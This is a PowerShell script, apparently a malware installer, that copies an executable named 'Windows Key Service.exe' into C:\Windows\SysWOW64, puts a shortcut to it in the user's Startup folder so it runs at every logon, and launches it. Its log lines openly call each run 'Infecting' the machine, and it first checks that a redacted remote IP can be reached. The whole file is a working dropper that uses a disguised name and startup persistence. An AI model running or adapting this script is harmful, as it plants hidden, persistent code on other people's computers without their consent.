$BaseDir = "Z:\"
$App = "Windows Key Service.exe"
$DestDir = "C:\Windows\SysWOW64\"
$DestIp = "***REMOVED***"
$InstallPath = "$DestDir$App"
$ShortcutDir = "C:\Users\Mark\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\service.lnk"

$Machine = [Environment]::MachineName
$LogDate = Get-Date -Format "ddMMyyyy-HHmm"
$LogDir = "Z:\Logs\"
$LogFile = "$LogDir$Machine-$LogDate.txt"
$DateTime = Get-Date

function Install()
{
    "Infecting $Machine on $DateTime" | Out-File -Append -FilePath $LogFile

    ipconfig /all | Out-File -Append -FilePath $LogFile

    $IsConnected = Test-Connection -Quiet $DestIp
    if ($IsConnected)
    {
        try {
            # Install
            Copy-Item -Path "$BaseDir$App" -Destination $DestDir -ErrorAction Stop 2>&1 >> $LogFile
            
            # Create shortcut
            $objShell = New-Object -ComObject ("WScript.Shell")
            $objShortCut = $objShell.CreateShortcut($ShortcutDir)
            $objShortCut.TargetPath = $InstallPath
            $objShortCut.Save()

            # Start application
            Start-Process -FilePath $InstallPath
        } catch {
            $_.Exception.Message | Out-File -Append -FilePath $LogFile
        }

    }
    else
    {
        "Cannot connect to $DestIp" | Out-File -Append -FilePath $LogFile
    }
}

function Uninstall()
{
    Remove-Item $InstallPath | Out-File -Append -FilePath $LogFile
    Remove-Item $ShortcutDir | Out-File -Append -FilePath $LogFile
    "Uninstalled $InstallPath" | Out-File -Append -FilePath $LogFile
}


if (!(Test-Path $LogDir))
{
    New-Item -ItemType Directory -Force -Path $LogDir
}

if (Get-Command $InstallPath -ErrorAction SilentlyContinue)
{
    Uninstall
}
else
{
    Install
}
